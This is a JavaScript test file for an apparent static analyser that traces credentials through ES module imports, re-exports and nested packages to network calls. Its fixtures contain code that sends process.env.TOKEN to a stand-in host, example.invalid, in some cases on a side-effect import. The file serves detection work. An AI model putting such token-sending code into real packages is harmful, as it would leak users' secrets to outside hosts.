import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { analyzeProject } from '../src/analyze.mjs';

function fixture(t, entry) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'compose-ray-esm-'));
  t.after(() => fs.rmSync(root, { recursive: true, force: true }));
  const write = (file, data) => {
    const target = path.join(root, file); fs.mkdirSync(path.dirname(target), { recursive: true });
    fs.writeFileSync(target, typeof data === 'string' ? data : JSON.stringify(data));
  };
  const manifest = { name: 'esm-app', version: '1.0.0', type: 'module' };
  const lock = { lockfileVersion: 3, packages: { '': manifest } };
  write('package.json', manifest); write('package-lock.json', lock); write('entry.mjs', entry);
  const add = (id, files, metadata = {}) => {
    const name = id.split('node_modules/').at(-1);
    lock.packages[id] = { version: metadata.version || '1.0.0' };
    write(`${id}/package.json`, { name, version: '1.0.0', type: 'module', exports: './index.js', ...metadata });
    for (const [file, source] of Object.entries(files)) write(`${id}/${file}`, source);
    write('package-lock.json', lock);
  };
  return { root, write, add, scan: options => analyzeProject({ root, entry: 'entry.mjs', ...options }) };
}
const send = 'export function send(value){fetch("https://example.invalid",{body:value});}';
const gap = (report, code) => report.gaps.some(g => g.code === code);

test('ESM named/default imports preserve a three-package credential route and harmless control', t => {
  for (const payload of ['process.env.TOKEN', '"public"']) {
    const f = fixture(t, 'import read from "reader";import {format} from "format";import {send} from "sender";send(format(read()));');
    f.add('node_modules/reader', { 'index.js': `export default function read(){return ${payload};}` });
    f.add('node_modules/format', { 'index.js': 'export const format=value=>"token="+JSON.stringify({value});' });
    f.add('node_modules/sender', { 'index.js': send });
    const r = f.scan();
    assert.equal(r.verdict, payload === '"public"' ? 'no-flow-found' : 'review', JSON.stringify(r.gaps));
    if (r.findings.length) assert.deepEqual([...new Set(r.findings[0].trace.map(s => s.package.name))].sort(), ['esm-app', 'format', 'reader', 'sender']);
    assert.equal(r.imports.length, 3);
  }
});

test('ESM imports are hoisted and aliases, namespaces, and named re-exports compose', t => {
  const f = fixture(t, 'transmit(process.env.TOKEN);import {deliver as transmit} from "sender";');
  f.add('node_modules/sender', { 'index.js': 'export {send as deliver} from "./send.js";', 'send.js': send });
  assert.equal(f.scan().verdict, 'review');
  f.write('entry.mjs', 'import * as client from "sender";client.deliver(process.env.TOKEN);');
  assert.equal(f.scan().verdict, 'review');
  f.write('entry.mjs', 'import {deliver} from "sender";export {deliver};');
  assert.equal(f.scan().verdict, 'no-flow-found', 'Uncalled exports are outside the entry scope.');
});

test('local exports and default expressions preserve evaluation timing', t => {
  const f = fixture(t, 'import value from "./value.mjs";fetch("https://example.invalid",{body:value});');
  f.write('value.mjs', 'let value=process.env.TOKEN;export default value;value="public";');
  assert.equal(f.scan().verdict, 'review');
  f.write('value.mjs', 'const value=process.env.TOKEN;export {value as default};');
  assert.equal(f.scan().verdict, 'review');
  f.write('value.mjs', 'export default function(){return process.env.TOKEN;}');
  f.write('entry.mjs', 'import read from "./value.mjs";fetch("https://example.invalid",{body:read()});');
  assert.equal(f.scan().verdict, 'review');
});

test('side-effect imports run once and precede the importing module body', t => {
  const f = fixture(t, 'import "./effect.mjs";import "./effect.mjs";');
  f.write('effect.mjs', 'fetch("https://example.invalid",{body:process.env.TOKEN});');
  const r = f.scan();
  assert.equal(r.verdict, 'review'); assert.equal(r.findings.length, 1); assert.equal(r.stats.modules, 2);
});

test('re-exported sensitive values cite the intermediate package', t => {
  const f = fixture(t, 'import {token} from "relay";fetch("https://example.invalid",{body:token});');
  f.add('node_modules/reader', { 'index.js': 'export const token=process.env.TOKEN;' });
  f.add('node_modules/relay', { 'index.js': 'export {token} from "reader";' });
  const r = f.scan();
  assert.equal(r.verdict, 'review');
  assert.deepEqual([...new Set(r.findings[0].trace.map(s => s.package.name))], ['reader', 'relay', 'esm-app']);
});

test('anonymous defaults, default re-exports, and modeled HTTP imports retain source evidence', t => {
  const f = fixture(t, 'import send from "./bridge.mjs";send(process.env.TOKEN);');
  f.write('bridge.mjs', 'export {default} from "./sender.mjs";');
  f.write('sender.mjs', 'import {request} from "node:https";export default value=>request("https://example.invalid",{headers:{Authorization:value}}).end();');
  const r = f.scan();
  assert.equal(r.verdict, 'review', JSON.stringify(r.gaps));
  assert.equal(r.findings[0].trace.at(-1).label, 'node:https.request');
});

test('exported binding mutations and unknown re-exported values cannot become a clean verdict', t => {
  const f = fixture(t, 'import {change,value} from "./lib.mjs";change();fetch("https://example.invalid",{body:value});');
  f.write('lib.mjs', 'let value="public";export {value};export function change(){value=process.env.TOKEN;}');
  assert.equal(f.scan().verdict, 'incomplete');
  f.write('lib.mjs', 'export {missing as value} from "./other.mjs";export const change=()=>undefined;');
  f.write('other.mjs', 'export const present=1;');
  assert.ok(gap(f.scan(), 'missing-export'));
});

test('ESM resolves exact conditional exports in declaration order, ignoring type-only branches', t => {
  const f = fixture(t, 'import {send} from "sender";send(process.env.TOKEN);');
  f.add('node_modules/sender', { 'index.js': send, 'public.js': 'export const send=value=>undefined;' },
    { exports: { '.': { types: './missing.d.ts', require: './missing.cjs', import: './index.js', default: './public.js' } } });
  assert.equal(f.scan().verdict, 'review');
  f.write('node_modules/sender/package.json', { name: 'sender', version: '1.0.0', type: 'module', exports: { default: './public.js', import: './index.js' } });
  assert.equal(f.scan().verdict, 'no-flow-found');
  f.write('node_modules/sender/package.json', { name: 'sender', version: '1.0.0', type: 'module', exports: { node: { import: './index.js' } } });
  assert.equal(f.scan().verdict, 'review');
});

test('ESM caller locations select nested versions and exact subpath exports', t => {
  const f = fixture(t, 'import {relay} from "relay";relay(process.env.TOKEN);');
  f.add('node_modules/sender', { 'index.js': 'export const send=value=>undefined;' });
  f.add('node_modules/relay', { 'index.js': 'import {send} from "sender/send";export const relay=value=>send(value);' });
  f.add('node_modules/relay/node_modules/sender', { 'index.js': send }, { version: '2.0.0', exports: { './send': './index.js' } });
  const r = f.scan();
  assert.equal(r.verdict, 'review');
  assert.equal(r.findings[0].trace.at(-1).package.id, 'node_modules/relay/node_modules/sender');
});

test('missing named exports and imports assigned by consumers never silently clear', t => {
  const f = fixture(t, 'import {missing} from "./lib.mjs";');
  f.write('lib.mjs', 'export const present=1;');
  assert.ok(gap(f.scan(), 'missing-export'));
  f.write('entry.mjs', 'import {present} from "./lib.mjs";present=2;');
  assert.equal(f.scan().verdict, 'incomplete');
});

test('ESM does not invent CommonJS globals or extension/directory resolution', t => {
  const f = fixture(t, 'require("./lib.mjs");');
  f.write('lib.mjs', 'export const value=1;');
  assert.equal(f.scan().verdict, 'incomplete');
  f.write('entry.mjs', 'import "./lib";');
  assert.ok(gap(f.scan(), 'unsupported-esm-resolution'));
  f.write('lib/index.js', 'export const value=1;');
  assert.ok(gap(f.scan(), 'unsupported-esm-resolution'));
});

test('cycles, mutable live exports, star exports and async remain explicit gaps', t => {
  for (const code of ['export let value=1;', 'export var value=1;', 'export * from "./other.mjs";',
    'export const send=async value=>fetch("https://example.invalid",{body:value});',
    'await fetch("https://example.invalid");', 'import("./other.mjs");']) {
    const f = fixture(t, code); f.write('other.mjs', 'export const value=1;');
    assert.equal(f.scan().verdict, 'incomplete', code);
  }
  const f = fixture(t, 'import "./a.mjs";');
  f.write('a.mjs', 'import "./b.mjs";'); f.write('b.mjs', 'import "./a.mjs";');
  assert.ok(gap(f.scan(), 'module-cycle'));
});

test('CommonJS/ESM interop is rejected instead of guessing a namespace', t => {
  const f = fixture(t, 'import send from "./lib.cjs";send(process.env.TOKEN);');
  f.write('lib.cjs', 'module.exports=value=>fetch("https://example.invalid",{body:value});');
  assert.ok(gap(f.scan(), 'unsupported-module-interop'));
  f.write('main.cjs', 'require("./entry.mjs");');
  assert.ok(gap(f.scan({ entry: 'main.cjs' }), 'unsupported-module-interop'));
});

test('unsupported export conditions and unsafe export targets do not fall back', t => {
  for (const exports of [{ browser: './index.js', default: './index.js' }, ['./index.js'], './node_modules/x.js', './%2e%2e/x.js']) {
    const f = fixture(t, 'import {send} from "sender";send(process.env.TOKEN);');
    f.add('node_modules/sender', { 'index.js': send }, { exports });
    assert.ok(gap(f.scan(), 'unsupported-exports'), JSON.stringify(exports));
  }
});

test('ESM analysis does not execute source and module budgets remain enforced', t => {
  const f = fixture(t, 'import "./child.mjs";');
  const marker = path.join(f.root, 'must-not-exist');
  f.write('child.mjs', `import fs from 'node:fs';fs.writeFileSync(${JSON.stringify(marker)},'executed');`);
  assert.equal(f.scan().verdict, 'incomplete'); assert.equal(fs.existsSync(marker), false);
  assert.ok(gap(f.scan({ limits: { maxModules: 1 } }), 'module-budget'));
});
